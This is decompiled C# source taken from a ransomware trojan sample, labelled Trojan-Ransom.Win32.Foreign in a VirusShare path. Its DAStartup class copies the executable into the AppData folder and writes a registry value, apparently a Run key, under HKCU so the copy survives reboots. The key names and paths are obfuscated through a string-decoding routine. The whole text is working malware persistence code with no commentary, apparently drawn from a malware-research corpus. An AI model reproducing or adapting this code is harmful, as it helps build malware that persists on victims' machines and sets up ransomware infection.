// Decompiled with JetBrains decompiler
// Type: DAStartup
// Assembly: 222222, Version=7.75.26.79, Culture=neutral, PublicKeyToken=null
// MVID: 4BBEBC6C-8846-4FD8-8CBA-F3F42BFE498C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mxnf-86627272f15f9986eda96f2b9cf928cf060c453bafd8c484fce237fd3ff62a0a.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class DAStartup
{
  public class Startupdll
  {
    public static string MyVAL = UYGQQYLC.WEGPJNXO("aK+vt6dFkrCzqIqyIw==", "False");
    public static string MYPTH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + UYGQQYLC.WEGPJNXO("hZG4ubqYt768vIUe", "False") + UYGQQYLC.WEGPJNXO("ZbSuurKIpni2u4kj", "False");

    public static void StartPers()
    {
      int num1 = 0;
      try
      {
        if (!File.Exists(DAStartup.Startupdll.MYPTH))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, DAStartup.Startupdll.MYPTH, true);
      }
      catch (Exception ex)
      {
        int num2;
        int lErl = num2;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        int num3 = 1;
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(UYGQQYLC.WEGPJNXO("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), true);
          registryKey.SetValue(DAStartup.Startupdll.MyVAL, (object) DAStartup.Startupdll.MYPTH);
          registryKey.Close();
          Thread.Sleep(5000);
          try
          {
            UGMVUKMJ.STRTTHRD.Abort();
            break;
          }
          catch (Exception ex)
          {
            int lErl = num3;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
            break;
          }
        }
        catch (Exception ex1)
        {
          int lErl1 = num3;
          ProjectData.SetProjectError(ex1, lErl1);
          if (num1 == 3)
          {
            try
            {
              UGMVUKMJ.STRTTHRD.Abort();
            }
            catch (Exception ex2)
            {
              int lErl2 = num3;
              ProjectData.SetProjectError(ex2, lErl2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
            break;
          }
          checked { ++num1; }
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
